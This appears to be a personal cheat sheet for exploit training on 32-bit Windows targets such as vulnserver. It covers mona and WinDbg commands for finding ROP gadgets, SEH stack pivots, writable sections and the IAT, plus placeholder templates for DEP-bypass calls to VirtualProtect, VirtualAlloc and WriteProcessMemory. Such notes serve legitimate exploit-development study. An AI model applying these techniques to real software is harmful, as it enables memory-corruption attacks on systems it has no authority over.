# DEP bypass
Some methods and hint to bypass DEP

1. Have you overwrite EIP? 

    ```py
    !py mona find -type instr -s "ret" -m MODULE.dll
    ```

2. Have you overwrite SEH?

   ```py
    add esp, offset + ret
    mov esp, register + ret
    xchg register,esp + ret
    call register (se il registro punta al nostro buffer)
    mov reg,[ebp+0c] + call reg (or other references to seh record)
    push reg + pop esp + ret (if you control ‘reg’)
    mov reg, dword ptr fs:[0] + … + ret  (set esp indirectly, via SEH record)
    ```

3. Search mona modules without rebase
  
    ```py
    !py mona modules -cm rebase=false
    ```
    
    
4. Always remember the padding

    ```py
    ecx = pack("<I",0x68b90948)  # XOR ECX,ECX # MOV EAX,ECX # POP EBX # POP ESI # RETN
    ecx += pack('<L',0x41414141) # padding for pop ebp
    ecx += pack('<L',0x41414141) # padding for pop esi
    ```
    
5. Same for RETN 0xN

    ```py
    rop += istruzione_retn # padding for retn 0x04
    rop += istruzione_retn # padding for retn 0x04
    ```

6. Search RW module
 
    ```py
    0:000> !dh module
    ......

    SECTION HEADER #6
    .idata name
        224 virtual size
        6000 virtual address
        400 size of raw data
        1600 file pointer to raw data
        0 file pointer to relocation table
        0 file pointer to line numbers
        0 number of relocations
        0 number of line numbers
    C0300040 flags
         Initialized Data
         4 byte align
         Read Write
    ............
    
    0:000>  ? modules + 224 + 6000 + 4
    Evaluate expression: 1649435176 = 62506228
  
    0:000> !address 62506228
    Usage:                  Image
    Base Address:           62506000
    End Address:            62507000
    Region Size:            00001000 (   4.000 kB)
    State:                  00001000          MEM_COMMIT
    Protect:                00000004          PAGE_READWRITE
    Type:                   01000000          MEM_IMAGE
    Allocation Base:        62500000
    Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
    Image Path:             C:\Users\User\Desktop\vulnserver\essfunc.dll
    Module Name:            essfunc
    Loaded Image Name:      
    Mapped Image Name:      
    More info:              lmv m essfunc
    More info:              !lmi essfunc
    More info:              ln 0x62506228
    More info:              !dh 0x62500000
    ```

7. Get IAT
    ```py
    0:009> !dh fsws -f
        0  DLL characteristics
        0 [       0] address [size] of Export Directory
    192B50 [     1CC] address [size] of Import Directory
    1AE000 [   133E0] address [size] of Resource Directory
        0 [       0] address [size] of Exception Directory
        0 [       0] address [size] of Security Directory
        0 [       0] address [size] of Base Relocation Directory
    166C40 [      1C] address [size] of Debug Directory
        0 [       0] address [size] of Description Directory
        0 [       0] address [size] of Special Directory
        0 [       0] address [size] of Thread Storage Directory
        0 [       0] address [size] of Load Configuration Directory
        0 [       0] address [size] of Bound Import Directory
    166000 [     C40] address [size] of Import Address Table Directory
        0 [       0] address [size] of Delay Import Directory
        0 [       0] address [size] of COR20 Header Directory
        0 [       0] address [size] of Reserved Directory

    0:009> dps fsws +0x166000 L100
    00566000  7606eb20 advapi32!RegCloseKeyStub
    00566004  760731e0 advapi32!RegEnumKeyA
    00566008  7606ea50 advapi32!RegQueryValueExAStub
    005662f4  7588b6b0 KERNEL32!GetPrivateProfileStringA
    005662f8  7588ae50 KERNEL32!WritePrivateProfileStringA
    005662fc  758887a0 KERNEL32!GetModuleFileNameAStub
    ......
    0:009> dps
    ......
    ```
    
## VirtualProtect Basic Template

```py
#GOALS - VirtualProtect
#EAX 90909090 => Nop                                              
#ECX <writeable pointer> => lpflOldProtect                                
#EDX 00000040 => flNewProtect                                   
#EBX 00000201 => dwSize   512                                      
#ESP ???????? => Leave as is                                 
#EBP ???????? => Call to ESP (jmp, call, push,..) -> !py mona jmp -r esp -cpb '\x00'              
#ESI ???????? => PTR to VirtualProtect - DWORD PTR of VirtualProtect 
#EDI RETN => ROP-Nop same as EIP  --> !py mona find -type instr -s "retn" -m module.dll -cpb "\x00"
```
## VirtualProtect Sniper Template

```py
# Calling VirtualProtect with parameters
payload += struct.pack('<L', 0x77325c90)    # Pointer to kernel32.VirtualProtect()
payload += struct.pack('<L', 0x11111111)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
payload += struct.pack('<L', 0x22222222)    # lpAddress
payload += struct.pack('<L', 0x33333333)    # size of shellcode (0x500 is ok)
payload += struct.pack('<L', 0x44444444)    # flNewProtect (0x40)
payload += struct.pack('<L', 0x62506d10)    # pOldProtect (any writeable address)
```

## VirtualAlloc Template
```py
#GOAL       VirtualAlloc                                         
# EAX 90909090 => Nop                                                
# ECX 00000040 => flProtect                                         
# EDX 00001000 => flAllocationType                                    
# EBX 00000001 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)    !py mona jmp -r esp -cpb '\x00'                    
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of VirtualAlloc         
# EDI RETN => ROP-Nop same as EIP          !py mona find -type instr -s "retn" -m modulo.dll -cpb "\x00"   
```

## WriteProcessMemory Template
No encoding for this method! Create manually the shellcode
```py
# kernel32!WriteProcessMemory placeholder parameters
payload += struct.pack('<L', 0x7732ae50)    # Pointer to kernel32!WriteProcessMemory 
payload += struct.pack('<L', 0x61c72d10)    # RX from MODULE no aslr
payload += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
payload += struct.pack('<L', 0x61c72d10)    # lpBaseAddress = RX from MODULE no aslr
payload += struct.pack('<L', 0x11111111)    # lpBuffer = base address of shellcode (dynamically generated)
payload += struct.pack('<L', 0x22222222)    # nSize = size of shellcode 
payload += struct.pack('<L', 0x1004dd10)    # lpNumberOfBytesWritten = writable location RW in MODULE no aslr
```
## Resources
1. https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/
2. https://vickieli.dev/binary%20exploitation/data-execution-prevention/
3. https://connormcgarr.github.io/ROP/
4. https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf
5. https://www.fuzzysecurity.com/tutorials/expDev/7.html
6. https://h0mbre.github.io/Creating_Win32_ROP_Chains
7. https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html
